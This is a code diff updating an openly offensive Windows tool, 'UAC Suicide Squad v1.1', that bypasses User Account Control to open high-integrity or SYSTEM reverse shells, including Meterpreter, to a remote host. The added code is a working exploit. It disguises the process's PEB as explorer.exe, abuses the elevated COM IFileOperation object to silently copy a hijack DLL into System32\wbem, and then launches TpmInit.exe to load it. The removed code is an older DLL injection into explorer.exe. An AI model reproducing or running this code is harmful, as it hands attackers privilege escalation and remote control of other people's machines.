@@ -5,7 +5,7 @@
   / / / /_/ / / / / / // // / / / / /_
  /_/ / .___/_/ /_/ /_/___/_/ /_/_/\__/
     /_/
-                    UAC Suicide Squad
+               UAC Suicide Squad v1.1
                       By Cn33liz 2016
 
 A tool to Bypass User Account Control (UAC), to get a High Integrity (or SYSTEM) Reversed Command shell,
@@ -37,9 +37,7 @@ This version has been succesfully tested on Windows 8.1 x64 and Windows 10 x64 (
 #include <VersionHelpers.h>
 #include <compressapi.h>
 #include <wincrypt.h>
-
-
-EXTERN_C IMAGE_DOS_HEADER __ImageBase;
+#include <Shobjidl.h>
 
 
 void Usage(LPWSTR lpProgram) {
@@ -59,6 +57,321 @@ void Usage(LPWSTR lpProgram) {
 	wprintf(L" [>] Example4: Remote SYSTEM PowerShell:    %s 10.0.0.1 443 powershell system\n", lpProgram);
 	wprintf(L" [>] Example5: Remote Elevated Meterpreter: %s 10.0.0.1 443 msf\n", lpProgram);
 	wprintf(L" [>] Example6: Remote SYSTEM Meterpreter:   %s 10.0.0.1 443 msf system\n\n", lpProgram);
+}
+
+BOOL MasqueradePEB() {
+	/* Masquerade our process PEB structure to give it the appearance of a different process.
+	We can use this to perform an elevated file copy using COM, without the need to inject a DLL into explorer.exe.
+	We basicly fool the COM IFileOperation Object (which is relying on the Process Status API (PSAPI) to check for process identity)
+	into thinking it is called from the Windows Explorer Shell.
+
+	This function is based on the Bypass-UAC.ps1 code from @FuzzySec (b33f):
+	* https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1
+	Which is basically a reimplementation of two functions in the UACME bypass code from @hFireF0X:
+	* supMasqueradeProcess: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L504
+	* supxLdrEnumModulesCallback: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L477
+
+	The following links helped me a lot understanding the structures e.g:
+	* @rwfpl's terminus project: http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_combined.html
+	* Kernel-Mode Basics: Windows Linked Lists: http://www.osronline.com/article.cfm?article=499
+	*/
+
+	typedef struct _UNICODE_STRING {
+		USHORT Length;
+		USHORT MaximumLength;
+		PWSTR  Buffer;
+	} UNICODE_STRING, *PUNICODE_STRING;
+
+	typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
+		HANDLE ProcessHandle,
+		DWORD ProcessInformationClass,
+		PVOID ProcessInformation,
+		DWORD ProcessInformationLength,
+		PDWORD ReturnLength
+		);
+
+	typedef NTSTATUS(NTAPI *_RtlEnterCriticalSection)(
+		PRTL_CRITICAL_SECTION CriticalSection
+		);
+
+	typedef NTSTATUS(NTAPI *_RtlLeaveCriticalSection)(
+		PRTL_CRITICAL_SECTION CriticalSection
+		);
+
+	typedef void (WINAPI* _RtlInitUnicodeString)(
+		PUNICODE_STRING DestinationString,
+		PCWSTR SourceString
+		);
+
+	typedef struct _LIST_ENTRY {
+		struct _LIST_ENTRY  *Flink;
+		struct _LIST_ENTRY  *Blink;
+	} LIST_ENTRY, *PLIST_ENTRY;
+
+	typedef struct _PROCESS_BASIC_INFORMATION
+	{
+		LONG ExitStatus;
+		PVOID PebBaseAddress;
+		ULONG_PTR AffinityMask;
+		LONG BasePriority;
+		ULONG_PTR UniqueProcessId;
+		ULONG_PTR ParentProcessId;
+	} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
+
+	typedef struct _PEB_LDR_DATA {
+		ULONG Length;
+		BOOLEAN Initialized;
+		HANDLE SsHandle;
+		LIST_ENTRY InLoadOrderModuleList;
+		LIST_ENTRY InMemoryOrderModuleList;
+		LIST_ENTRY InInitializationOrderModuleList;
+		PVOID EntryInProgress;
+		BOOLEAN ShutdownInProgress;
+		HANDLE ShutdownThreadId;
+	} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+	typedef struct _RTL_USER_PROCESS_PARAMETERS {
+		BYTE           Reserved1[16];
+		PVOID          Reserved2[10];
+		UNICODE_STRING ImagePathName;
+		UNICODE_STRING CommandLine;
+	} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+
+	// Partial PEB
+	typedef struct _PEB {
+		BOOLEAN InheritedAddressSpace;
+		BOOLEAN ReadImageFileExecOptions;
+		BOOLEAN BeingDebugged;
+		union
+		{
+			BOOLEAN BitField;
+			struct
+			{
+				BOOLEAN ImageUsesLargePages : 1;
+				BOOLEAN IsProtectedProcess : 1;
+				BOOLEAN IsLegacyProcess : 1;
+				BOOLEAN IsImageDynamicallyRelocated : 1;
+				BOOLEAN SkipPatchingUser32Forwarders : 1;
+				BOOLEAN SpareBits : 3;
+			};
+		};
+		HANDLE Mutant;
+
+		PVOID ImageBaseAddress;
+		PPEB_LDR_DATA Ldr;
+		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+		PVOID SubSystemData;
+		PVOID ProcessHeap;
+		PRTL_CRITICAL_SECTION FastPebLock;
+	} PEB, *PPEB;
+
+	typedef struct _LDR_DATA_TABLE_ENTRY {
+		LIST_ENTRY InLoadOrderLinks;
+		LIST_ENTRY InMemoryOrderLinks;
+		union
+		{
+			LIST_ENTRY InInitializationOrderLinks;
+			LIST_ENTRY InProgressLinks;
+		};
+		PVOID DllBase;
+		PVOID EntryPoint;
+		ULONG SizeOfImage;
+		UNICODE_STRING FullDllName;
+		UNICODE_STRING BaseDllName;
+		ULONG Flags;
+		WORD LoadCount;
+		WORD TlsIndex;
+		union
+		{
+			LIST_ENTRY HashLinks;
+			struct
+			{
+				PVOID SectionPointer;
+				ULONG CheckSum;
+			};
+		};
+		union
+		{
+			ULONG TimeDateStamp;
+			PVOID LoadedImports;
+		};
+	} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+	DWORD dwPID;
+	PROCESS_BASIC_INFORMATION pbi;
+	PPEB peb;
+	PPEB_LDR_DATA pld;
+	PLDR_DATA_TABLE_ENTRY ldte;
+
+	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
+	if (NtQueryInformationProcess == NULL) {
+		return FALSE;
+	}
+
+	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
+	if (RtlEnterCriticalSection == NULL) {
+		return FALSE;
+	}
+
+	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
+	if (RtlLeaveCriticalSection == NULL) {
+		return FALSE;
+	}
+
+	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
+	if (RtlInitUnicodeString == NULL) {
+		return FALSE;
+	}
+
+	dwPID = GetCurrentProcessId();
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
+	if (hProcess == INVALID_HANDLE_VALUE)
+	{
+		return FALSE;
+	}
+
+	// Retrieves information about the specified process.
+	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
+
+	// Read pbi PebBaseAddress into PEB Structure
+	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+		return FALSE;
+	}
+
+	// Read Ldr Address into PEB_LDR_DATA Structure
+	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
+		return FALSE;
+	}
+
+	// Let's overwrite UNICODE_STRING structs in memory
+
+	// First set Explorer.exe location buffer
+	WCHAR chExplorer[MAX_PATH + 1];
+	GetWindowsDirectory(chExplorer, MAX_PATH);
+	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");
+
+	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
+	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);
+
+	// Take ownership of PEB
+	RtlEnterCriticalSection(peb->FastPebLock);
+
+	// Masquerade ImagePathName and CommandLine 
+	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
+	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);
+
+	// Masquerade FullDllName and BaseDllName
+	WCHAR wFullDllName[MAX_PATH];
+	WCHAR wExeFileName[MAX_PATH];
+	GetModuleFileName(NULL, wExeFileName, MAX_PATH);
+
+	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
+	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
+	do
+	{
+		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
+		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
+			return FALSE;
+		}
+
+		// Read FullDllName into string
+		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
+		{
+			return FALSE;
+		}
+
+		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
+			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
+			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
+			break;
+		}
+
+		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;
+
+	} while (pNextModuleInfo != pStartModuleInfo);
+
+	//Release ownership of PEB
+	RtlLeaveCriticalSection(peb->FastPebLock);
+
+	// Release Process Handle
+	CloseHandle(hProcess);
+
+	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL UACBypassCopy() {
+	IFileOperation *fileOperation = NULL;
+	WCHAR dllPath[1024];
+	LPCWSTR dllName = L"wbemcomn.dll";
+
+	GetModuleFileName(NULL, dllPath, 1024);
+	std::wstring path(dllPath);
+	const size_t last = path.rfind('\\');
+	if (std::wstring::npos != last)
+	{
+		path = path.substr(0, last + 1);
+	}
+	path += dllName;
+
+	// First Masquerade our Process as Explorer.exe 
+	if (!MasqueradePEB()) {
+		wprintf(L" -> Oops PEB masquerading failed!\n");
+		exit(1);
+	}
+
+	wprintf(L" -> Done!\n");
+	wprintf(L" [*] And use the IFileOperation::CopyItem method to copy our DLL");
+
+	LPCWSTR destPath = L"C:\\windows\\System32\\wbem";
+	BIND_OPTS3 bo;
+	SHELLEXECUTEINFOW shexec;
+
+	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+	if (SUCCEEDED(hr)) {
+		memset(&shexec, 0, sizeof(shexec));
+		memset(&bo, 0, sizeof(bo));
+		bo.cbStruct = sizeof(bo);
+		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
+		if (SUCCEEDED(hr)) {
+			hr = fileOperation->SetOperationFlags(
+				FOF_NOCONFIRMATION |
+				FOF_SILENT |
+				FOFX_SHOWELEVATIONPROMPT |
+				FOFX_NOCOPYHOOKS |
+				FOFX_REQUIREELEVATION |
+				FOF_NOERRORUI);
+			if (SUCCEEDED(hr)) {
+				IShellItem *from = NULL, *to = NULL;
+				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
+				if (SUCCEEDED(hr)) {
+					if (destPath)
+						hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
+					if (SUCCEEDED(hr)) {
+						hr = fileOperation->CopyItem(from, to, dllName, NULL);
+						if (NULL != to)
+							to->Release();
+					}
+					from->Release();
+				}
+				if (SUCCEEDED(hr)) {
+					hr = fileOperation->PerformOperations();
+				}
+			}
+			fileOperation->Release();
+		}
+		CoUninitialize();
+	}
+
+	return TRUE;
 }
 
 BOOL CheckValidIpAddr(LPCSTR lpIpAddr) {
@@ -181,13 +494,12 @@ int wmain(int argc, wchar_t* argv[])
 	HANDLE hFind;
 	LPCWSTR dllName = L"C:\\Windows\\System32\\wbem\\wbemcomn.dll";
 
-
 	wprintf(L"   ______           ____     _ __     \n");
 	wprintf(L"  /_  __/__  __ _  /  _/__  (_) /_    \n");
 	wprintf(L"   / / / _ \\/  ' \\_/ // _ \\/ / __/ \n");
 	wprintf(L"  /_/ / .__/_/_/_/___/_//_/_/\\__/    \n");
 	wprintf(L"     /_/                              \n");
-	wprintf(L"               UAC Suicide Squad      \n");
+	wprintf(L"          UAC Suicide Squad v1.1      \n");
 	wprintf(L"                 By Cn33liz 2016      \n\n");
 
 	if (argc < 4 || argc > 5) {
@@ -232,12 +544,7 @@ int wmain(int argc, wchar_t* argv[])
 		wprintf(L" [*] Dropping needed DLL's from memory");
 
 		CHAR *WbemComn = WbemComnB64();
-		CHAR *IFileOps = IFileOperationB64();
 		if (!Base64DecodeAndDecompressDLL(WbemComn, L"wbemcomn.dll")) {
-			wprintf(L" -> Oops something went wrong!\n");
-			exit(1);
-		}
-		if (!Base64DecodeAndDecompressDLL(IFileOps, L"IFileOperation.dll")) {
 			wprintf(L" -> Oops something went wrong!\n");
 			exit(1);
 		}
@@ -297,8 +604,7 @@ int wmain(int argc, wchar_t* argv[])
 			CHAR *MsfStager = MsfStagerB64();
 
 			GetTempPath(MAX_PATH, chMsfFile);
-			wcscat_s(chMsfFile, sizeof(chMsfFile) / sizeof(wchar_t), L"tmpMSFBLA.tmp");	
-			//if (!CopyFile(lpMsfdllName, chMsfFile, FALSE)) {
+			wcscat_s(chMsfFile, sizeof(chMsfFile) / sizeof(wchar_t), L"tmpMSFBLA.tmp");
 			if (!Base64DecodeAndDecompressDLL(MsfStager, chMsfFile)) {
 				wprintf(L" -> Oops something went wrong!\n");
 				exit(1);
@@ -306,69 +612,15 @@ int wmain(int argc, wchar_t* argv[])
 		}
 
 		wprintf(L" -> Done!\n");
-		
-		wprintf(L" [*] Now injecting the IFileOperation DLL into explorer.exe process....\n");
-		wprintf(L" [*] And use the IFileOperation::CopyItem method to copy our DLL");
 
-		DWORD pid = 0;
-		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-		PROCESSENTRY32 process;
-		ZeroMemory(&process, sizeof(process));
-
-		process.dwSize = sizeof(process);
-		if (Process32First(snapshot, &process))
-		{
-			do
-			{
-				if (wcscmp(process.szExeFile, L"explorer.exe") == 0)
-				{
-					pid = process.th32ProcessID;
-					break;
-				}
-			} while (Process32Next(snapshot, &process));
-		}
-
-		CloseHandle(snapshot);
-		if (pid == 0)
-			return -1;
-		auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
-		HANDLE hThread;
-		WCHAR DllPath[MAX_PATH] = { 0 };
-
-		GetModuleFileName((HINSTANCE)&__ImageBase, DllPath, _countof(DllPath));
-		std::wstring path(DllPath);
-		const size_t last = path.rfind('\\');
-		if (std::wstring::npos != last)
-		{
-			path = path.substr(0, last + 1);
-		}
-		path += L"IFileOperation.dll";
-
-		void* pLibRemote;
-		DWORD hLibModule;
-		HMODULE hKernel32 = ::GetModuleHandle(L"Kernel32");
-		pLibRemote = ::VirtualAllocEx(hProcess, NULL, sizeof(wchar_t)*(path.length() + 1),
-			MEM_COMMIT, PAGE_READWRITE);
-		WriteProcessMemory(hProcess, pLibRemote, (void*)path.data(),
-			sizeof(wchar_t)*(path.length() + 1), NULL);
-		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW"), pLibRemote, 0, NULL);
-		auto e = GetLastError();
-		WaitForSingleObject(hThread, INFINITE);
-		GetExitCodeThread(hThread, &hLibModule);
-		CloseHandle(hThread);
-		VirtualFreeEx(hProcess, pLibRemote, sizeof(wchar_t)*(path.length() + 1), MEM_RELEASE);
-
-		/* Not needed... Our DLL will Self Destruct ;)
-		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "FreeLibrary"), (void*)hLibModule, 0, NULL);
-		WaitForSingleObject(hThread, INFINITE);
-		CloseHandle(hThread);*/
-
+		wprintf(L" [*] Now Masquerade our Process (PEB) as Explorer.exe");
+		UACBypassCopy();
 
 		hFind = FindFirstFile(dllName, &FindFileData);
 		if (hFind == INVALID_HANDLE_VALUE)
 		{
-			wprintf(L" -> Oops something went wrong!\n");
+			wprintf(L" -> Oops IFileOperation::CopyItem failed!\n");
+			DeleteFile(L"wbemcomn.dll");
 			return 1;
 		}
 		else
@@ -384,14 +636,11 @@ int wmain(int argc, wchar_t* argv[])
 			wprintf(L" [*] Let's start TpmInit.exe, enable all privs and see if we get a session...\n");
 		}
 
-		//Not Needed... TpmInit.exe is started from within our injected IFileOperation DLL.
-		//ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\TpmInit.exe", NULL, NULL, SW_HIDE);
-		//Sleep(1000);
+		ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\TpmInit.exe", NULL, NULL, SW_HIDE);
 
 		wprintf(L" [*] Have fun!\n\n");
 
 		DeleteFile(L"wbemcomn.dll");
-		DeleteFile(L"IFileOperation.dll");
 
 		return 0;
 	}
